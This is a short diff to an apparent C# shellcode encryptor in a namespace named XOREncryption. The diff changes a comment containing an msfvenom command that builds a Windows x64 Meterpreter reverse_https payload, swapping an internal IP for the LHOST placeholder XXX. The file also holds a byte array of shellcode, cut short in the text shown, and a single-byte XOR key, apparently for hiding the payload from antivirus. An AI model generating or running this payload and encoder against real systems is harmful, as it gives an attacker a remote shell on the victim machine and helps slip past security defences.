@@ -10,7 +10,7 @@ namespace XOREncryption
     {
         static void Main(string[] args)
         {
-            // sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.217 LPORT=443 -f csharp | tr -d '\n'
+            // sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=XXX LPORT=443 -f csharp | tr -d '\n'
             byte[] buf = new byte[744] { 0xfc, 0x48, 0x83, 0xe4 ... };
 
             byte key = 0x02; // XOR Key
